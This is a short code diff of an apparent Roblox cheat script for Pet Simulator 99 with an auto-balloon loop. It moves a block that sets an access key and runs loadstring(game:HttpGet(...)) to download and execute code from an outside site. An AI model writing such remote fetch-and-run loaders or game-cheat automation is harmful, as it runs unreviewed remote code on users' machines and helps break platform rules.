@@ -96,6 +96,12 @@ game.Players.PlayerAdded:Connect(function(player)
     end
 end)
 
+getgenv().AuthKey = "HUGE_tRocmav6JBqs"
+getgenv().LoadSettings = {
+    Example_Setting = Example_Value
+}
+loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
+
 getgenv().autoBalloon = true
 
 getgenv().autoBalloonConfig = {
@@ -141,8 +147,3 @@ while getgenv().autoBalloon do
     end
 end
 
-getgenv().AuthKey = "HUGE_tRocmav6JBqs"
-getgenv().LoadSettings = {
-    Example_Setting = Example_Value
-}
-loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
